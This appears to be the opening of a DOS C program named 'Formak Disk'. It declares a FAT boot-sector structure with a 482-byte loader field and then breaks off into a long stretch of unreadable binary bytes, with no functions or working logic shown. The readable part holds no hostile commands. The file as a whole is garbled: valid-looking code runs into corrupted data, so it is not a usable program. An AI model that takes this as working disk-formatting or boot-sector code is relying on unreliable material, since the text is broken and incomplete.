/* Formak Disk */
#include <stdio.h>
#include <dos.h>
#include <ctype.h>

typedef unsigned char BYTE;
typedef unsigned int  WORD;

typedef struct tagdiskinfo {
  char signature;
  WORD skip;
  char vendor[8];
  WORD bytepersector;
  BYTE sectorpercluster;
  WORD reservedsectors;
  BYTE fatcopies;
  WORD rootentries;
  WORD totalsectors;
  BYTE media;
  WORD sectorperfat;
  WORD sectorpertrack;
  WORD heads;
  WORD hiddensectors;
  char loader [482];
} DISKINFO;

DISKINFO diskinfo;�vzwgw��¶��f����g���h�J<d��Wf�C�h�Xk*e�gZ�[xW�v�u�x;guv��7�7zf���y���g�g��izJhxsǔ�xwi�9�Kd�xW�g�f����whk9Ywiexvx:b�)|5������9��y�x��Zx�tȄƗw�����h�{jg��]U�i�Y�i��i��\������iGW�Y�[G�+-Xy��w�U�u��<K���HxHX��������X��yXW��Ye���ig��xYZ���i9�W�=[��z;�t�w��7��ZW�G�Yg��Z���������yv!)��y��w[��{������޺�r![���޵3z޶x��$��2'�S7�u[��{��A j��;�A���9�![��"GBF�A��w����@ Y��G� 7��'vW��!&�vw�W�ei̘��Q I��5� I�� Y���{�efS%��$�ʘ�܄ ��2T �� '����Z܄5d$z�[�v��ʄ ��54]�`}옪s5��7x5gb7��Iު���� )V;�� }����5��!X�cVfW�tYݸ��Q �`�S�� ;��z�5��!7�eUTg�SX���ި �� 9D;������cY�y�gR#��|ۇ��� �� 8_�@����B}�b&�fyP���ʩ���@��'AK������Am��5�fyp��{�����r ��@�G�� ���� ]��6�V��Y�d6���z��0��X� ܪޑ��DvC{�'��vE{뇍�� 	��V�� ȝ�P��x���fTz������ۂ ��� ]�P�K���ټ���DVBY�3h�{ʈ�ۃ }�#� =��7B;���������A7�uuei������@��~ ��Y@��Ws'��5c7�Q�6xbG�x�����@���@��@	���A:˫�"X���#eU�TV���x��s |ɟ� jy��e]��f#}�gby��R!xx�Cy�߅�ˆ��f��z[���4xWΦe!7�k�7I�ufi����� ���
`�}�gG�ɪ"Y���E 7x��TZɉ�[�~��R�����y���#z�"hg�uCxw�%T7���h��������%�9���7tI���FA7���UhX�c��w������U��_��[bl����D�i�x�%t7�ht&2vb�u�U�y�̫�����o�[�:�����yE�i�Vt&dz�hA3c�x�9a7e|��